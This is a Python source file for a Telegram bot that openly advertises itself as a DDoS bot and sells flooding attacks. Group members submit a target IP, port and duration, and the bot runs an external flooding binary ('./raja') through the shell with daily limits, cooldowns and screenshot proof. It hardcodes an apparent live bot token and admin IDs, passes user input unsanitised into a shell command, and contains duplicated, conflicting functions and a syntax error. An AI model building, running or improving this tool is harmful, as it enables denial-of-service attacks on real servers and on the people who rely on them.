#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import aiohttp
import threading
import random
# Insert your Telegram bot token here
bot = telebot.TeleBot('7749918794:AAFlgbWy2k9BTzJMPjFB1eJe7G4WUBniMrQ')


# Admin user IDs
admin_id = ["1662672529"]

# Group and channel details
GROUP_ID = "-1002356850946"
CHANNEL_USERNAME = "@jsbananannanan"

# Default cooldown and attack limits
COOLDOWN_TIME = 30  # Cooldown in seconds
ATTACK_LIMIT = 10  # Max attacks per day
pending_feedback = {}  # यूजर 
user_data = {}
pending_feedback = {}
global_last_attack_time = None
global_pending_attack = None

# Files to store user data
USER_FILE = "users.txt"

# Dictionary to store user states
user_data = {}
global_last_attack_time = None  # Global cooldown tracker

# 🎯 Random Image URLs  
image_urls = [
    "https://envs.sh/g7a.jpg",
    "https://envs.sh/g7O.jpg",
    "https://envs.sh/g7_.jpg",
    "https://envs.sh/gHR.jpg",
    "https://envs.sh/gH4.jpg",
    "https://envs.sh/gHU.jpg",
    "https://envs.sh/gHl.jpg",
    "https://envs.sh/gH1.jpg",
    "https://envs.sh/gHk.jpg",
    "https://envs.sh/68x.jpg",
    "https://envs.sh/67E.jpg",
    "https://envs.sh/67Q.jpg",
    "https://envs.sh/686.jpg",
    "https://envs.sh/68V.jpg",
    "https://envs.sh/68-.jpg",
    "https://envs.sh/Vwn.jpg",
    "https://envs.sh/Vwe.jpg",
    "https://envs.sh/VwZ.jpg",
    "https://envs.sh/VwG.jpg",
    "https://envs.sh/VwK.jpg",
    "https://envs.sh/VwA.jpg",
    "https://envs.sh/Vw_.jpg",
    "https://envs.sh/Vwc.jpg"
]

def is_user_in_channel(user_id):
    return True  # **यहीं पर Telegram API से चेक कर सकते हो**
# Function to load user data from the file
def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None
                }
    except FileNotFoundError:
        pass

# Function to save user data to the file
def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

# Middleware to ensure users are joined to the channel
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

pending_feedback = {}  # यूजर की स्क्रीनशॉट वेटिंग स्टेट स्टोर करने के लि

def is_user_in_channel(user_id):
    return True  

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global global_last_attack_time, global_pending_attack

    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, f"🚫 **𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀!** ❌\n🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐰: {https://t.me/aloneboyisnaj}")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ **𝐏𝐀𝐇𝐋𝐄 𝐉𝐎𝐈𝐍 𝐊𝐑𝐎** {CHANNEL_USERNAME} 🔥")
        return

    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "😡 **𝐏𝐄𝐇𝐋𝐄 𝐆𝐀𝐌𝐄 𝐊𝐀 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐃𝐄!** 🔥")
        return

    if global_pending_attack is not None:
        bot.reply_to(message, "⚠️ **𝐀𝐛𝐡𝐢 𝐄𝐤 𝐀𝐭𝐭𝐚𝐜𝐤 𝐂𝐡𝐚𝐥 𝐑𝐡𝐚 𝐇𝐚𝐢!** ⚡")
        return

    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
        bot.reply_to(message, f"⏳ **𝐖𝐀𝐈𝐓 {remaining_time}𝐬, 𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍 𝐂𝐇𝐀𝐋 𝐑𝐇𝐀 𝐇𝐀𝐈!** 🚀")
        return

    if user_id not in user_data:
        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None}

    user = user_data[user_id]
    if user['attacks'] >= ATTACK_LIMIT:
        bot.reply_to(message, f"❌ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐈𝐌𝐈𝐓 𝐊𝐇𝐓𝐌!** ❌\n🔄 *𝐓𝐑𝐘 𝐀𝐆𝐀𝐈𝐍 𝐓𝐎𝐌𝐎𝐑𝐑𝐎𝐖!*")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ **𝐔𝐒𝐀𝐆𝐄:** /attack `<IP>` `<PORT>` `<TIME>`")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **𝐏𝐎𝐑𝐓 𝐀𝐍𝐃 𝐓𝐈𝐌𝐄 𝐌𝐔𝐒𝐓 𝐁𝐄 𝐍𝐔𝐌𝐁𝐄𝐑𝐒!**")
        return

    if time_duration > 180:
        bot.reply_to(message, "🚫 **𝐌𝐀𝐗 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 = 𝟏8𝟎𝐬!**")
        return

    full_command = f"./raja {target} {port} {time_duration} 150"
    random_image = random.choice(image_urls)

    bot.send_photo(message.chat.id, random_image, 
                   caption=f"💥 **𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!** 💥\n"
                           f"🎯 **𝐓𝐀𝐑𝐆𝐄𝐓:** `{target} : {port}`\n"
                           f"⏳ **𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍:** {time_duration}𝙨\n"
                           f"⚡ **𝐒𝐭𝐚𝐭𝐮𝐬: 𝐑𝐮𝐧𝐧𝐢𝐧𝐠...**")

    pending_feedback[user_id] = True  
    global_pending_attack = user_id  

    try:
        subprocess.run(full_command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ **𝐄𝐑𝐑𝐎𝐑:** {e}")
        global_pending_attack = None
        pending_feedback[user_id] = False
        return

    send_attack_finished(message, user_id, target, port, time_duration)

def send_attack_finished(message, user_id, target, port, time_duration):
    global global_last_attack_time, global_pending_attack

    bot.send_message(message.chat.id, 
                     f"✅ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄!** ✅\n"
                     f"🎯 `{target}:{port}` **𝐃𝐄𝐒𝐓𝐑𝐎𝐘𝐄𝐃!**\n"
                     f"⏳ **𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍:** {time_duration}𝙨\n"
                     f"📸 **𝐍𝐎𝐖 𝐒𝐄𝐍𝐃 𝐘𝐎𝐔𝐑 𝐆𝐀𝐌𝐄 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓!**")

    global_last_attack_time = datetime.datetime.now()
    global_pending_attack = None  

@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    
    if pending_feedback.get(user_id, False):
        pending_feedback[user_id] = False  
        bot.reply_to(message, "✅ **𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃! 𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐀𝐋𝐋𝐎𝐖𝐄𝐃!** 🚀")
    else:
        bot.reply_to(message, "⚠️ **𝐓𝐇𝐈𝐒 𝐈𝐒 𝐍𝐎𝐓 𝐀 𝐕𝐀𝐋𝐈𝐃 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄!**")


    
@bot.message_handler(commands=['check_cooldown'])
def check_cooldown(message):
    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
        bot.reply_to(message, f"Global cooldown: {remaining_time} seconds remaining.")
    else:
        bot.reply_to(message, "No global cooldown. You can initiate an attack.")

# Command to check remaining attacks for a user
@bot.message_handler(commands=['check_remaining_attack'])
def check_remaining_attack(message):
    user_id = str(message.from_user.id)
    if user_id not in user_data:
        bot.reply_to(message, f"You have {ATTACK_LIMIT} attacks remaining for today.")
    else:
        remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
        bot.reply_to(message, f"You have {remaining_attacks} attacks remaining for today.")

# Admin commands
@bot.message_handler(commands=['reset'])
def reset_user(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /reset <user_id>")
        return

    user_id = command[1]
    if user_id in user_data:
        user_data[user_id]['attacks'] = 0
        save_users()
        bot.reply_to(message, f"Attack limit for user {user_id} has been reset.")
    else:
        bot.reply_to(message, f"No data found for user {user_id}.")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /setcooldown <seconds>")
        return

    global COOLDOWN_TIME
    try:
        COOLDOWN_TIME = int(command[1])
        bot.reply_to(message, f"Cooldown time has been set to {COOLDOWN_TIME} seconds.")
    except ValueError:
        bot.reply_to(message, "Please provide a valid number of seconds.")

@bot.message_handler(commands=['viewusers'])
def view_users(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    user_list = "\n".join([f"User ID: {user_id}, Attacks Used: {data['attacks']}, Remaining: {ATTACK_LIMIT - data['attacks']}" 
                           for user_id, data in user_data.items()])
    bot.reply_to(message, f"User Summary:\n\n{user_list}")
    

# 📸 **𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐂𝐇𝐄𝐂𝐊𝐄𝐑** 📸
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    
    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "✅ **𝐓𝐇𝐀𝐍𝐊𝐒, 𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐑𝐄𝐀𝐃𝐘!** 💥")
        pending_feedback[user_id] = False  
    else:
        bot.reply_to(message, "❌ **𝐘𝐎𝐔 𝐃𝐎𝐍'𝐓 𝐍𝐄𝐄𝐃 𝐓𝐎 𝐆𝐈𝐕𝐄 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐍𝐎𝐖!**")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"""🌟🔥 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐁𝐑𝐎 {user_name} 🔥🌟
    
🚀 **𝐘𝐨𝐮'𝐫𝐞 𝐢𝐧 𝐓𝐡𝐞 𝐇𝐎𝐌𝐄 𝐨𝐟 𝐏𝐎𝐖𝐄𝐑!**  
💥 𝐓𝐡𝐞 𝐖𝐎𝐑𝐋𝐃'𝐒 𝐁𝐄𝐒𝐓 **DDOS BOT** 🔥  
⚡ 𝐁𝐄 𝐓𝐇𝐄 𝐊𝐈𝐍𝐆, 𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐄 𝐓𝐇𝐄 𝐖𝐄𝐁!  

🔗 **𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭, 𝐉𝐨𝐢𝐧 𝐍𝐨𝐰:**  
👉 [𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙂𝙧𝙤𝙪𝙥](https://t.me/aloneboyisnaj) 🚀🔥"""
    
    bot.reply_to(message, response, parse_mode="Markdown")
# Function to reset daily limits automatically
def auto_reset():
    while True:
        now = datetime.datetime.now()
        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
        time.sleep(seconds_until_midnight)
        for user_id in user_data:
            user_data[user_id]['attacks'] = 0
            user_data[user_id]['last_reset'] = datetime.datetime.now()
        save_users()

# Start auto-reset in a separate thread
reset_thread = threading.Thread(target=auto_reset, daemon=True)
reset_thread.start()

# Load user data on startup
load_users()


#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        # Add a small delay to avoid rapid looping in case of persistent errors
        time.sleep(15)
        
        
 






